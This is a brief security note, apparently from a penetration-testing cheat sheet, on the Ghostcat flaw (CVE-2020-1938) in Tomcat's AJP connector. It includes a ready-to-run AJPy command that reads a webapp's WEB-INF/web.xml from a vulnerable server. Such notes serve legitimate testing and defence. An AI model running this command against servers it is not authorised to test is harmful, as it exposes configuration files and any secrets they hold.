Ghostcat (CVE-2020-1938)
========================


On vulnerable Tomcat it's possible to download a file from a webapp using the
`AJP` protocol. At the moment, it's not possible to read file from an other
location (`/etc/passwd`for instance) or execute code.

The tool [`AJPy`](https://github.com/hypn0s/AJPy) has the exploitation code:

```bash
python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 127.0.0.1
```
